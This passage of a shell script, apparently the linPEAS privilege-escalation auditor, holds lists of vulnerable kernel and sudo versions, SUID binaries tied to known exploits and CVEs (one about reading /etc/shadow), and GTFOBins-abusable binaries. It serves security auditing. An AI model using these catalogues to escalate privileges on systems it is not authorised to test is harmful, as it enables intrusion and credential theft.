   301	kernelDCW_Rhel5_1="2.6.24.7-74.el5rt|2.6.24.7-81.el5rt|2.6.24.7-93.el5rt|2.6.24.7-101.el5rt|2.6.24.7-108.el5rt|2.6.24.7-111.el5rt|2.6.24.7-117.el5rt|2.6.24.7-126.el5rt|2.6.24.7-132.el5rt|2.6.24.7-137.el5rt|2.6.24.7-139.el5rt|2.6.24.7-146.el5rt|2.6.24.7-149.el5rt|2.6.24.7-161.el5rt|2.6.24.7-169.el5rt|2.6.33.7-rt29.45.el5rt|2.6.33.7-rt29.47.el5rt|2.6.33.7-rt29.55.el5rt|2.6.33.9-rt31.64.el5rt|2.6.33.9-rt31.67.el5rt|2.6.33.9-rt31.86.el5rt|2.6.18-8.1.1.el5|2.6.18-8.1.3.el5|2.6.18-8.1.4.el5|2.6.18-8.1.6.el5|2.6.18-8.1.8.el5|2.6.18-8.1.10.el5|2.6.18-8.1.14.el5|2.6.18-8.1.15.el5|2.6.18-53.el5|2.6.18-53.1.4.el5|2.6.18-53.1.6.el5|2.6.18-53.1.13.el5|2.6.18-53.1.14.el5|2.6.18-53.1.19.el5|2.6.18-53.1.21.el5|2.6.18-92.el5|2.6.18-92.1.1.el5|2.6.18-92.1.6.el5|2.6.18-92.1.10.el5|2.6.18-92.1.13.el5|2.6.18-92.1.18.el5|2.6.18-92.1.22.el5|2.6.18-92.1.24.el5|2.6.18-92.1.26.el5|2.6.18-92.1.27.el5|2.6.18-92.1.28.el5|2.6.18-92.1.29.el5|2.6.18-92.1.32.el5|2.6.18-92.1.35.el5|2.6.18-92.1.38.el5|2.6.18-128.el5|2.6.18-128.1.1.el5|2.6.18-128.1.6.el5|2.6.18-128.1.10.el5|2.6.18-128.1.14.el5|2.6.18-128.1.16.el5|2.6.18-128.2.1.el5|2.6.18-128.4.1.el5|2.6.18-128.4.1.el5|2.6.18-128.7.1.el5|2.6.18-128.8.1.el5|2.6.18-128.11.1.el5|2.6.18-128.12.1.el5|2.6.18-128.14.1.el5|2.6.18-128.16.1.el5|2.6.18-128.17.1.el5|2.6.18-128.18.1.el5|2.6.18-128.23.1.el5|2.6.18-128.23.2.el5|2.6.18-128.25.1.el5|2.6.18-128.26.1.el5|2.6.18-128.27.1.el5"
   302	kernelDCW_Rhel5_2="2.6.18-128.29.1.el5|2.6.18-128.30.1.el5|2.6.18-128.31.1.el5|2.6.18-128.32.1.el5|2.6.18-128.35.1.el5|2.6.18-128.36.1.el5|2.6.18-128.37.1.el5|2.6.18-128.38.1.el5|2.6.18-128.39.1.el5|2.6.18-128.40.1.el5|2.6.18-128.41.1.el5|2.6.18-164.el5|2.6.18-164.2.1.el5|2.6.18-164.6.1.el5|2.6.18-164.9.1.el5|2.6.18-164.10.1.el5|2.6.18-164.11.1.el5|2.6.18-164.15.1.el5|2.6.18-164.17.1.el5|2.6.18-164.19.1.el5|2.6.18-164.21.1.el5|2.6.18-164.25.1.el5|2.6.18-164.25.2.el5|2.6.18-164.28.1.el5|2.6.18-164.30.1.el5|2.6.18-164.32.1.el5|2.6.18-164.34.1.el5|2.6.18-164.36.1.el5|2.6.18-164.37.1.el5|2.6.18-164.38.1.el5|2.6.18-194.el5|2.6.18-194.3.1.el5|2.6.18-194.8.1.el5|2.6.18-194.11.1.el5|2.6.18-194.11.3.el5|2.6.18-194.11.4.el5|2.6.18-194.17.1.el5|2.6.18-194.17.4.el5|2.6.18-194.26.1.el5|2.6.18-194.32.1.el5|2.6.18-238.el5|2.6.18-238.1.1.el5|2.6.18-238.5.1.el5|2.6.18-238.9.1.el5|2.6.18-238.12.1.el5|2.6.18-238.19.1.el5|2.6.18-238.21.1.el5|2.6.18-238.27.1.el5|2.6.18-238.28.1.el5|2.6.18-238.31.1.el5|2.6.18-238.33.1.el5|2.6.18-238.35.1.el5|2.6.18-238.37.1.el5|2.6.18-238.39.1.el5|2.6.18-238.40.1.el5|2.6.18-238.44.1.el5|2.6.18-238.45.1.el5|2.6.18-238.47.1.el5|2.6.18-238.48.1.el5|2.6.18-238.49.1.el5|2.6.18-238.50.1.el5|2.6.18-238.51.1.el5|2.6.18-238.52.1.el5|2.6.18-238.53.1.el5|2.6.18-238.54.1.el5|2.6.18-238.55.1.el5|2.6.18-238.56.1.el5|2.6.18-274.el5|2.6.18-274.3.1.el5|2.6.18-274.7.1.el5|2.6.18-274.12.1.el5"
   303	kernelDCW_Rhel5_3="2.6.18-274.17.1.el5|2.6.18-274.18.1.el5|2.6.18-308.el5|2.6.18-308.1.1.el5|2.6.18-308.4.1.el5|2.6.18-308.8.1.el5|2.6.18-308.8.2.el5|2.6.18-308.11.1.el5|2.6.18-308.13.1.el5|2.6.18-308.16.1.el5|2.6.18-308.20.1.el5|2.6.18-308.24.1.el5|2.6.18-348.el5|2.6.18-348.1.1.el5|2.6.18-348.2.1.el5|2.6.18-348.3.1.el5|2.6.18-348.4.1.el5|2.6.18-348.6.1.el5|2.6.18-348.12.1.el5|2.6.18-348.16.1.el5|2.6.18-348.18.1.el5|2.6.18-348.19.1.el5|2.6.18-348.21.1.el5|2.6.18-348.22.1.el5|2.6.18-348.23.1.el5|2.6.18-348.25.1.el5|2.6.18-348.27.1.el5|2.6.18-348.28.1.el5|2.6.18-348.29.1.el5|2.6.18-348.30.1.el5|2.6.18-348.31.2.el5|2.6.18-371.el5|2.6.18-371.1.2.el5|2.6.18-371.3.1.el5|2.6.18-371.4.1.el5|2.6.18-371.6.1.el5|2.6.18-371.8.1.el5|2.6.18-371.9.1.el5|2.6.18-371.11.1.el5|2.6.18-371.12.1.el5|2.6.18-398.el5|2.6.18-400.el5|2.6.18-400.1.1.el5|2.6.18-402.el5|2.6.18-404.el5|2.6.18-406.el5|2.6.18-407.el5|2.6.18-408.el5|2.6.18-409.el5|2.6.18-410.el5|2.6.18-411.el5|2.6.18-412.el5"
   304	kernelDCW_Rhel6_1="2.6.33.9-rt31.66.el6rt|2.6.33.9-rt31.74.el6rt|2.6.33.9-rt31.75.el6rt|2.6.33.9-rt31.79.el6rt|3.0.9-rt26.45.el6rt|3.0.9-rt26.46.el6rt|3.0.18-rt34.53.el6rt|3.0.25-rt44.57.el6rt|3.0.30-rt50.62.el6rt|3.0.36-rt57.66.el6rt|3.2.23-rt37.56.el6rt|3.2.33-rt50.66.el6rt|3.6.11-rt28.20.el6rt|3.6.11-rt30.25.el6rt|3.6.11.2-rt33.39.el6rt|3.6.11.5-rt37.55.el6rt|3.8.13-rt14.20.el6rt|3.8.13-rt14.25.el6rt|3.8.13-rt27.33.el6rt|3.8.13-rt27.34.el6rt|3.8.13-rt27.40.el6rt|3.10.0-229.rt56.144.el6rt|3.10.0-229.rt56.147.el6rt|3.10.0-229.rt56.149.el6rt|3.10.0-229.rt56.151.el6rt|3.10.0-229.rt56.153.el6rt|3.10.0-229.rt56.158.el6rt|3.10.0-229.rt56.161.el6rt|3.10.0-229.rt56.162.el6rt|3.10.0-327.rt56.170.el6rt|3.10.0-327.rt56.171.el6rt|3.10.0-327.rt56.176.el6rt|3.10.0-327.rt56.183.el6rt|3.10.0-327.rt56.190.el6rt|3.10.0-327.rt56.194.el6rt|3.10.0-327.rt56.195.el6rt|3.10.0-327.rt56.197.el6rt|3.10.33-rt32.33.el6rt|3.10.33-rt32.34.el6rt|3.10.33-rt32.43.el6rt|3.10.33-rt32.45.el6rt|3.10.33-rt32.51.el6rt|3.10.33-rt32.52.el6rt|3.10.58-rt62.58.el6rt|3.10.58-rt62.60.el6rt|2.6.32-71.7.1.el6|2.6.32-71.14.1.el6|2.6.32-71.18.1.el6|2.6.32-71.18.2.el6|2.6.32-71.24.1.el6|2.6.32-71.29.1.el6|2.6.32-71.31.1.el6|2.6.32-71.34.1.el6|2.6.32-71.35.1.el6|2.6.32-71.36.1.el6|2.6.32-71.37.1.el6|2.6.32-71.38.1.el6|2.6.32-71.39.1.el6|2.6.32-71.40.1.el6|2.6.32-131.0.15.el6|2.6.32-131.2.1.el6|2.6.32-131.4.1.el6|2.6.32-131.6.1.el6|2.6.32-131.12.1.el6"
   305	kernelDCW_Rhel6_2="2.6.32-131.17.1.el6|2.6.32-131.21.1.el6|2.6.32-131.22.1.el6|2.6.32-131.25.1.el6|2.6.32-131.26.1.el6|2.6.32-131.28.1.el6|2.6.32-131.29.1.el6|2.6.32-131.30.1.el6|2.6.32-131.30.2.el6|2.6.32-131.33.1.el6|2.6.32-131.35.1.el6|2.6.32-131.36.1.el6|2.6.32-131.37.1.el6|2.6.32-131.38.1.el6|2.6.32-131.39.1.el6|2.6.32-220.el6|2.6.32-220.2.1.el6|2.6.32-220.4.1.el6|2.6.32-220.4.2.el6|2.6.32-220.4.7.bgq.el6|2.6.32-220.7.1.el6|2.6.32-220.7.3.p7ih.el6|2.6.32-220.7.4.p7ih.el6|2.6.32-220.7.6.p7ih.el6|2.6.32-220.7.7.p7ih.el6|2.6.32-220.13.1.el6|2.6.32-220.17.1.el6|2.6.32-220.23.1.el6|2.6.32-220.24.1.el6|2.6.32-220.25.1.el6|2.6.32-220.26.1.el6|2.6.32-220.28.1.el6|2.6.32-220.30.1.el6|2.6.32-220.31.1.el6|2.6.32-220.32.1.el6|2.6.32-220.34.1.el6|2.6.32-220.34.2.el6|2.6.32-220.38.1.el6|2.6.32-220.39.1.el6|2.6.32-220.41.1.el6|2.6.32-220.42.1.el6|2.6.32-220.45.1.el6|2.6.32-220.46.1.el6|2.6.32-220.48.1.el6|2.6.32-220.51.1.el6|2.6.32-220.52.1.el6|2.6.32-220.53.1.el6|2.6.32-220.54.1.el6|2.6.32-220.55.1.el6|2.6.32-220.56.1.el6|2.6.32-220.57.1.el6|2.6.32-220.58.1.el6|2.6.32-220.60.2.el6|2.6.32-220.62.1.el6|2.6.32-220.63.2.el6|2.6.32-220.64.1.el6|2.6.32-220.65.1.el6|2.6.32-220.66.1.el6|2.6.32-220.67.1.el6|2.6.32-279.el6|2.6.32-279.1.1.el6|2.6.32-279.2.1.el6|2.6.32-279.5.1.el6|2.6.32-279.5.2.el6|2.6.32-279.9.1.el6|2.6.32-279.11.1.el6|2.6.32-279.14.1.bgq.el6|2.6.32-279.14.1.el6|2.6.32-279.19.1.el6|2.6.32-279.22.1.el6|2.6.32-279.23.1.el6|2.6.32-279.25.1.el6|2.6.32-279.25.2.el6|2.6.32-279.31.1.el6|2.6.32-279.33.1.el6|2.6.32-279.34.1.el6|2.6.32-279.37.2.el6|2.6.32-279.39.1.el6"
   306	kernelDCW_Rhel6_3="2.6.32-279.41.1.el6|2.6.32-279.42.1.el6|2.6.32-279.43.1.el6|2.6.32-279.43.2.el6|2.6.32-279.46.1.el6|2.6.32-358.el6|2.6.32-358.0.1.el6|2.6.32-358.2.1.el6|2.6.32-358.6.1.el6|2.6.32-358.6.2.el6|2.6.32-358.6.3.p7ih.el6|2.6.32-358.11.1.bgq.el6|2.6.32-358.11.1.el6|2.6.32-358.14.1.el6|2.6.32-358.18.1.el6|2.6.32-358.23.2.el6|2.6.32-358.28.1.el6|2.6.32-358.32.3.el6|2.6.32-358.37.1.el6|2.6.32-358.41.1.el6|2.6.32-358.44.1.el6|2.6.32-358.46.1.el6|2.6.32-358.46.2.el6|2.6.32-358.48.1.el6|2.6.32-358.49.1.el6|2.6.32-358.51.1.el6|2.6.32-358.51.2.el6|2.6.32-358.55.1.el6|2.6.32-358.56.1.el6|2.6.32-358.59.1.el6|2.6.32-358.61.1.el6|2.6.32-358.62.1.el6|2.6.32-358.65.1.el6|2.6.32-358.67.1.el6|2.6.32-358.68.1.el6|2.6.32-358.69.1.el6|2.6.32-358.70.1.el6|2.6.32-358.71.1.el6|2.6.32-358.72.1.el6|2.6.32-358.73.1.el6|2.6.32-358.111.1.openstack.el6|2.6.32-358.114.1.openstack.el6|2.6.32-358.118.1.openstack.el6|2.6.32-358.123.4.openstack.el6|2.6.32-431.el6|2.6.32-431.1.1.bgq.el6|2.6.32-431.1.2.el6|2.6.32-431.3.1.el6|2.6.32-431.5.1.el6|2.6.32-431.11.2.el6|2.6.32-431.17.1.el6|2.6.32-431.20.3.el6|2.6.32-431.20.5.el6|2.6.32-431.23.3.el6|2.6.32-431.29.2.el6|2.6.32-431.37.1.el6|2.6.32-431.40.1.el6|2.6.32-431.40.2.el6|2.6.32-431.46.2.el6|2.6.32-431.50.1.el6|2.6.32-431.53.2.el6|2.6.32-431.56.1.el6|2.6.32-431.59.1.el6|2.6.32-431.61.2.el6|2.6.32-431.64.1.el6|2.6.32-431.66.1.el6|2.6.32-431.68.1.el6|2.6.32-431.69.1.el6|2.6.32-431.70.1.el6"
   307	kernelDCW_Rhel6_4="2.6.32-431.71.1.el6|2.6.32-431.72.1.el6|2.6.32-431.73.2.el6|2.6.32-431.74.1.el6|2.6.32-504.el6|2.6.32-504.1.3.el6|2.6.32-504.3.3.el6|2.6.32-504.8.1.el6|2.6.32-504.8.2.bgq.el6|2.6.32-504.12.2.el6|2.6.32-504.16.2.el6|2.6.32-504.23.4.el6|2.6.32-504.30.3.el6|2.6.32-504.30.5.p7ih.el6|2.6.32-504.33.2.el6|2.6.32-504.36.1.el6|2.6.32-504.38.1.el6|2.6.32-504.40.1.el6|2.6.32-504.43.1.el6|2.6.32-504.46.1.el6|2.6.32-504.49.1.el6|2.6.32-504.50.1.el6|2.6.32-504.51.1.el6|2.6.32-504.52.1.el6|2.6.32-573.el6|2.6.32-573.1.1.el6|2.6.32-573.3.1.el6|2.6.32-573.4.2.bgq.el6|2.6.32-573.7.1.el6|2.6.32-573.8.1.el6|2.6.32-573.12.1.el6|2.6.32-573.18.1.el6|2.6.32-573.22.1.el6|2.6.32-573.26.1.el6|2.6.32-573.30.1.el6|2.6.32-573.32.1.el6|2.6.32-573.34.1.el6|2.6.32-642.el6|2.6.32-642.1.1.el6|2.6.32-642.3.1.el6|2.6.32-642.4.2.el6|2.6.32-642.6.1.el6"
   308	kernelDCW_Rhel7="3.10.0-229.rt56.141.el7|3.10.0-229.1.2.rt56.141.2.el7_1|3.10.0-229.4.2.rt56.141.6.el7_1|3.10.0-229.7.2.rt56.141.6.el7_1|3.10.0-229.11.1.rt56.141.11.el7_1|3.10.0-229.14.1.rt56.141.13.el7_1|3.10.0-229.20.1.rt56.141.14.el7_1|3.10.0-229.rt56.141.el7|3.10.0-327.rt56.204.el7|3.10.0-327.4.5.rt56.206.el7_2|3.10.0-327.10.1.rt56.211.el7_2|3.10.0-327.13.1.rt56.216.el7_2|3.10.0-327.18.2.rt56.223.el7_2|3.10.0-327.22.2.rt56.230.el7_2|3.10.0-327.28.2.rt56.234.el7_2|3.10.0-327.28.3.rt56.235.el7|3.10.0-327.36.1.rt56.237.el7|3.10.0-123.el7|3.10.0-123.1.2.el7|3.10.0-123.4.2.el7|3.10.0-123.4.4.el7|3.10.0-123.6.3.el7|3.10.0-123.8.1.el7|3.10.0-123.9.2.el7|3.10.0-123.9.3.el7|3.10.0-123.13.1.el7|3.10.0-123.13.2.el7|3.10.0-123.20.1.el7|3.10.0-229.el7|3.10.0-229.1.2.el7|3.10.0-229.4.2.el7|3.10.0-229.7.2.el7|3.10.0-229.11.1.el7|3.10.0-229.14.1.el7|3.10.0-229.20.1.el7|3.10.0-229.24.2.el7|3.10.0-229.26.2.el7|3.10.0-229.28.1.el7|3.10.0-229.30.1.el7|3.10.0-229.34.1.el7|3.10.0-229.38.1.el7|3.10.0-229.40.1.el7|3.10.0-229.42.1.el7|3.10.0-327.el7|3.10.0-327.3.1.el7|3.10.0-327.4.4.el7|3.10.0-327.4.5.el7|3.10.0-327.10.1.el7|3.10.0-327.13.1.el7|3.10.0-327.18.2.el7|3.10.0-327.22.2.el7|3.10.0-327.28.2.el7|3.10.0-327.28.3.el7|3.10.0-327.36.1.el7|3.10.0-327.36.2.el7|3.10.0-229.1.2.ael7b|3.10.0-229.4.2.ael7b|3.10.0-229.7.2.ael7b|3.10.0-229.11.1.ael7b|3.10.0-229.14.1.ael7b|3.10.0-229.20.1.ael7b|3.10.0-229.24.2.ael7b|3.10.0-229.26.2.ael7b|3.10.0-229.28.1.ael7b|3.10.0-229.30.1.ael7b|3.10.0-229.34.1.ael7b|3.10.0-229.38.1.ael7b|3.10.0-229.40.1.ael7b|3.10.0-229.42.1.ael7b|4.2.0-0.21.el7"
   309	
   310	
   311	MyUID=$(id -u $(whoami))
   312	if [ "$MyUID" ]; then myuid=$MyUID; elif [ $(id -u $(whoami) 2>/dev/null) ]; then myuid=$(id -u $(whoami) 2>/dev/null); elif [ "$(id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1)" ]; then myuid=$(id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1); fi
   313	if [ $myuid -gt 2147483646 ]; then baduid="|$myuid"; fi
   314	idB="euid|egid$baduid"
   315	sudovB="[01].[012345678].[0-9]+|1.9.[01234]|1.9.5p1"
   316	
   317	mounted=$( (cat /proc/self/mountinfo || cat /proc/1/mountinfo) 2>/dev/null | cut -d " " -f5 | grep "^/" | tr '\n' '|')$(cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}')
   318	if ! [ "$mounted" ]; then 
   319	  mounted=$( (mount -l || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts) 2>/dev/null | grep "^/" | cut -d " " -f1 | tr '\n' '|')$(cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}')
   320	fi
   321	if ! [ "$mounted" ]; then mounted="ImPoSSssSiBlEee"; fi #Don't let any blacklist to be empty
   322	mountG="swap|/cdrom|/floppy|/dev/shm"
   323	notmounted=$(cat /etc/fstab 2>/dev/null | grep "^/" | grep -Ev "$mountG" | awk '{print $1}' | grep -Ev "$mounted" | tr '\n' '|')"ImPoSSssSiBlEee"
   324	mountpermsB="\Wsuid|\Wuser|\Wexec"
   325	mountpermsG="nosuid|nouser|noexec"
   326	
   327	rootcommon="/init$|upstart-udev-bridge|udev|/getty|cron|apache2|java|tomcat|/vmtoolsd|/VGAuthService"
   328	
   329	groupsB="\(root\)|\(shadow\)|\(admin\)|\(video\)|\(adm\)|\(wheel\)|\(auth\)"
   330	groupsVB="\(sudo\)|\(docker\)|\(lxd\)|\(disk\)|\(lxc\)"
   331	knw_grps='\(lpadmin\)|\(cdrom\)|\(plugdev\)|\(nogroup\)' #https://www.togaware.com/linux/survivor/Standard_Groups.html
   332	mygroups=$(groups 2>/dev/null | tr " " "|")
   333	
   334	# Default Binaries List
   335	sidG1="/abuild-sudo$|/accton$|/allocate$|/ARDAgent$|/arping$|/atq$|/atrm$|/authpf$|/authpf-noip$|/authopen$|/batch$|/bbsuid$|/bsd-write$|/btsockstat$|/bwrap$|/cacaocsc$|/camel-lock-helper-1.2$|/ccreds_validate$|/cdrw$|/chage$|/check-foreground-console$|/chrome-sandbox$|/chsh$|/cons.saver$|/crontab$|/ct$|/cu$|/dbus-daemon-launch-helper$|/deallocate$|/desktop-create-kmenu$|/dma$|/dma-mbox-create$|/dmcrypt-get-device$|/doas$|/dotlockfile$|/dotlock.mailutils$|/dtaction$|/dtfile$|/eject$|/execabrt-action-install-debuginfo-to-abrt-cache$|/execdbus-daemon-launch-helper$|/execdma-mbox-create$|/execlockspool$|/execlogin_chpass$|/execlogin_lchpass$|/execlogin_passwd$|/execssh-keysign$|/execulog-helper$|/exim4|/expiry$|/fdformat$|/fstat$|/fusermount$|/fusermount3$"
   336	sidG2="/gnome-pty-helper$|/glines$|/gnibbles$|/gnobots2$|/gnome-suspend$|/gnometris$|/gnomine$|/gnotski$|/gnotravex$|/gpasswd$|/gpg$|/gpio$|/gtali|/.hal-mtab-lock$|/helper$|/imapd$|/inndstart$|/kismet_cap_nrf_51822$|/kismet_cap_nxp_kw41z$|/kismet_cap_ti_cc_2531$|/kismet_cap_ti_cc_2540$|/kismet_cap_ubertooth_one$|/kismet_capture$|/kismet_cap_linux_bluetooth$|/kismet_cap_linux_wifi$|/kismet_cap_nrf_mousejack$|/ksu$|/list_devices$|/load_osxfuse$|/locate$|/lock$|/lockdev$|/lockfile$|/login_activ$|/login_crypto$|/login_radius$|/login_skey$|/login_snk$|/login_token$|/login_yubikey$|/lpc$|/lpd$|/lpd-port$|/lppasswd$|/lpq$|/lpr$|/lprm$|/lpset$|/lxc-user-nic$|/mahjongg$|/mail-lock$|/mailq$|/mail-touchlock$|/mail-unlock$|/mksnap_ffs$|/mlocate$|/mlock$|/mount$|/mount.cifs$|/mount.ecryptfs_private$|/mount.nfs$|/mount.nfs4$|/mount_osxfuse$|/mtr$|/mutt_dotlock$"
   337	sidG3="/ncsa_auth$|/netpr$|/netkit-rcp$|/netkit-rlogin$|/netkit-rsh$|/netreport$|/netstat$|/newgidmap$|/newtask$|/newuidmap$|/nvmmctl$|/opieinfo$|/opiepasswd$|/pam_auth$|/pam_extrausers_chkpwd$|/pam_timestamp_check$|/pamverifier$|/pfexec$|/ping$|/ping6$|/pmconfig$|/pmap$|/polkit-agent-helper-1$|/polkit-explicit-grant-helper$|/polkit-grant-helper$|/polkit-grant-helper-pam$|/polkit-read-auth-helper$|/polkit-resolve-exe-helper$|/polkit-revoke-helper$|/polkit-set-default-helper$|/postdrop$|/postqueue$|/poweroff$|/ppp$|/procmail$|/pstat$|/pt_chmod$|/pwdb_chkpwd$|/quota$|/rcmd|/remote.unknown$|/rlogin$|/rmformat$|/rnews$|/run-mailcap$|/sacadm$|/same-gnome$|screen.real$|/security_authtrampoline$|/sendmail.sendmail$|/shutdown$|/skeyaudit$|/skeyinfo$|/skeyinit$|/sliplogin|/slocate$|/smbmnt$|/smbumount$|/smpatch$|/smtpctl$|/sperl5.8.8$|/ssh-agent$|/ssh-keysign$|/staprun$|/startinnfeed$|/stclient$|/su$|/suexec$|/sys-suspend$|/sysstat$|/systat$"
   338	sidG4="/telnetlogin$|/timedc$|/tip$|/top$|/traceroute6$|/traceroute6.iputils$|/trpt$|/tsoldtlabel$|/tsoljdslabel$|/tsolxagent$|/ufsdump$|/ufsrestore$|/ulog-helper$|/umount.cifs$|/umount.nfs$|/umount.nfs4$|/unix_chkpwd$|/uptime$|/userhelper$|/userisdnctl$|/usernetctl$|/utempter$|/utmp_update$|/uucico$|/uuglist$|/uuidd$|/uuname$|/uusched$|/uustat$|/uux$|/uuxqt$|/VBoxHeadless$|/VBoxNetAdpCtl$|/VBoxNetDHCP$|/VBoxNetNAT$|/VBoxSDL$|/VBoxVolInfo$|/VirtualBoxVM$|/vmstat$|/vmware-authd$|/vmware-user-suid-wrapper$|/vmware-vmx$|/vmware-vmx-debug$|/vmware-vmx-stats$|/vncserver-x11$|/volrmmount$|/w$|/wall$|/whodo$|/write$|/X$|/Xorg.wrap$|/Xsun$|/Xvnc$|/yppasswd$"
   339	
   340	#Rules: Start path " /", end path "$", divide path and vulnversion "%". SPACE IS ONLY ALLOWED AT BEGINNING, DONT USE IT IN VULN DESCRIPTION
   341	sidB="/apache2$%Read_root_passwd__apache2_-f_/etc/shadow\(CVE-2019-0211\)\
   342	 /at$%RTru64_UNIX_4.0g\(CVE-2002-1614\)\
   343	 /abrt-action-install-debuginfo-to-abrt-cache$%CENTOS 7.1/Fedora22
   344	 /chfn$%SuSE_9.3/10\
   345	 /chkey$%Solaris_2.5.1\
   346	 /chkperm$%Solaris_7.0_\
   347	 /chpass$%2Vulns:OpenBSD_6.1_to_OpenBSD 6.6\(CVE-2019-19726\)--OpenBSD_2.7_i386/OpenBSD_2.6_i386/OpenBSD_2.5_1999/08/06/OpenBSD_2.5_1998/05/28/FreeBSD_4.0-RELEASE/FreeBSD_3.5-RELEASE/FreeBSD_3.4-RELEASE/NetBSD_1.4.2\
   348	 /chpasswd$%SquirrelMail\(2004-04\)\
   349	 /dtappgather$%Solaris_7_<_11_\(SPARC/x86\)\(CVE-2017-3622\)\
   350	 /dtprintinfo$%Solaris_10_\(x86\)_and_lower_versions_also_SunOS_5.7_to_5.10\
   351	 /dtsession$%Oracle_Solaris_10_1/13_and_earlier\(CVE-2020-2696\)\
   352	 /eject$%FreeBSD_mcweject_0.9/SGI_IRIX_6.2\
   353	 /ibstat$%IBM_AIX_Version_6.1/7.1\(09-2013\)\
   354	 /kcheckpass$%KDE_3.2.0_<-->_3.4.2_\(both_included\)\
   355	 /kdesud$%KDE_1.1/1.1.1/1.1.2/1.2\
   356	 /keybase-redirector%CentOS_Linux_release_7.4.1708\
   357	 /login$%IBM_AIX_3.2.5/SGI_IRIX_6.4\
   358	 /lpc$%S.u.S.E_Linux_5.2\
   359	 /lpr$%BSD/OS2.1/FreeBSD2.1.5/NeXTstep4.x/IRIX6.4/SunOS4.1.3/4.1.4\(09-1996\)\
   360	 /mail.local$%NetBSD_7.0-7.0.1__6.1-6.1.5__6.0-6.0.6
   361	 /mount$%Apple_Mac_OSX\(Lion\)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\
   362	 /movemail$%Emacs\(08-1986\)\
   363	 /mrinfo$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
   364	 /mtrace$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
   365	 /netprint$%IRIX_5.3/6.2/6.3/6.4/6.5/6.5.11\
   366	 /newgrp$%HP-UX_10.20\
   367	 /ntfs-3g$%Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others\(02-2017\)\
   368	 /passwd$%Apple_Mac_OSX\(03-2006\)/Solaris_8/9\(12-2004\)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1\(02-1997\)\
   369	 /pkexec$%Linux4.10_to_5.1.17\(CVE-2019-13272\)/rhel_6\(CVE-2011-1485\)\
   370	 /pppd$%Apple_Mac_OSX_10.4.8\(05-2007\)\
   371	 /pt_chown$%GNU_glibc_2.1/2.1.1_-6\(08-1999\)\
   372	 /pulseaudio$%\(Ubuntu_9.04/Slackware_12.2.0\)\
   373	 /rcp$%RedHat_6.2\
   374	 /rdist$%Solaris_10/OpenSolaris\
   375	 /rsh$%Apple_Mac_OSX_10.9.5/10.10.5\(09-2015\)\
   376	 /screen$%GNU_Screen_4.5.0\
   377	 /sdtcm_convert$%Sun_Solaris_7.0\
   378	 /sendmail$%Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_\(SGI_ProPack_1.2/1.3\)\
   379	 /snap-confine$%Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation\(CVE-2019-7304\)\
   380	 /sudo%check_if_the_sudo_version_is_vulnerable\
   381	 /Serv-U%FTP_Server<15.1.7(CVE-2019-12181)
   382	 /sudoedit$%Sudo/SudoEdit_1.6.9p21/1.7.2p4/\(RHEL_5/6/7/Ubuntu\)/Sudo<=1.8.14\
   383	 /tmux$%Tmux_1.3_1.4_privesc\(CVE-2011-1496\)\
   384	 /traceroute$%LBL_Traceroute_\[2000-11-15\]\
   385	 /ubuntu-core-launcher$%Befre_1.0.27.1\(CVE-2016-1580\)\
   386	 /umount$%BSD/Linux\(08-1996\)\
   387	 /umount-loop$%Rocks_Clusters<=4.1\(07-2006\)\
   388	 /uucp$%Taylor_UUCP_1.0.6\
   389	 /XFree86$%XFree86_X11R6_3.3.x/4.0/4.x/3.3\(03-2003\)\
   390	 /xlock$%BSD/OS_2.1/DG/UX_7.0/Debian_1.3/HP-UX_10.34/IBM_AIX_4.2/SGI_IRIX_6.4/Solaris_2.5.1\(04-1997\)\
   391	 /xscreensaver%Solaris_11.x\(CVE-2019-3010\)\
   392	 /xorg$%Xorg_1.19_to_1.20.x\(CVE_2018-14665\)/xorg-x11-server<=1.20.3/AIX_7.1_\(6.x_to_7.x_should_be_vulnerable\)_X11.base.rte<7.1.5.32_and_\
   393	 /xterm$%Solaris_5.5.1_X11R6.3\(05-1997\)/Debian_xterm_version_222-1etch2\(01-2009\)"
   394	#To update sidVB: curl https://github.com/GTFOBins/GTFOBins.github.io/tree/master/_gtfobins 2>/dev/null | grep 'href="/GTFOBins/' | grep '.md">' | awk -F 'title="' '{print $2}' | cut -d '"' -f1 | cut -d "." -f1 | sed  -e 's,^,/,' | sed  -e 's,$,\$,' | tr '\n' '|'
   395	sidVB='/aa-exec$|/ab$|/agetty$|/alpine$|/ar$|/aria2c$|/arj$|/arp$|/as$|/ascii-xfr$|/ash$|/aspell$|/atobm$|/awk$|/base32$|/base64$|/basenc$|/basez$|/bash$|/batcat$|/bc$|/bridge$|/busybox$|/byebug$|/bzip2$|/cabal$|/capsh$|/cat$|/chmod$|/choom$|/chown$|/chroot$|/cmp$|/column$|/comm$|/composer$|/cp$|/cpio$|/cpulimit$|/csh$|/csplit$|/csvtool$|/cupsfilter$|/curl$|/cut$|/dash$|/date$|/dd$|/debugfs$|/dialog$|/diff$|/dig$|/distcc$|/dmsetup$|/docker$|/dosbox$|/dvips$|/ed$|/efax$|/elvish$|/emacs$|/env$|/eqn$|/espeak$|/expand$|/expect$|/file$|/find$|/fish$|/flock$|/fmt$|/fold$|/gawk$|/gcore$|/gdb$|/genie$|/genisoimage$|/gimp$|/ginsh$|/git$|/grep$|/gtester$|/gzip$|/hd$|/head$|/hexdump$|/highlight$|/hping3$|/iconv$|/iftop$|/install$|/ionice$|/ip$|/ispell$|/jjs$|/joe$|/join$|/jq$|/jrunscript$|/julia$|/ksh$|/ksshell$|/kubectl$|/latex$|/ldconfig$|/less$|/lftp$|/logsave$|/look$|/lua$|/lualatex$|/luatex$|/make$|/mawk$|/more$|/mosquitto$|/msgattrib$|/msgcat$|/msgconv$|/msgfilter$|/msgmerge$|/msguniq$|/multitime$|/mv$'
